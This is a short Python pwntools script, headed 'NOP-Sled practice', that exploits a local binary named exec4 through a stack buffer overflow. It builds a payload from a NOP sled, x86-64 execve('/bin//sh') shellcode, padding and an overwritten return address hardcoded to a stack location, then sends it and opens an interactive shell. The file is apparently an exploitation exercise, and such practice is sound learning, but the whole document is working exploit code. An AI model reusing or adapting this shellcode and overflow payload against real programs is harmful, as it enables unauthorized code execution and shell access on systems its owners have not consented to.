#######################
## NOP-Sled practice ##
#######################

from pwn import *

p = process("./exec4")

shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

## Change buf_addr based on your OS ##
buf_addr = 0x7fffffffde50

payload = b""
payload += b"\x90"*0x20
payload += shellcode
payload += b"\x00"*(0x48-len(payload))
payload += p64(buf_addr)

pause()
p.sendafter("Hello! Enter Your Input: ", payload)

p.interactive()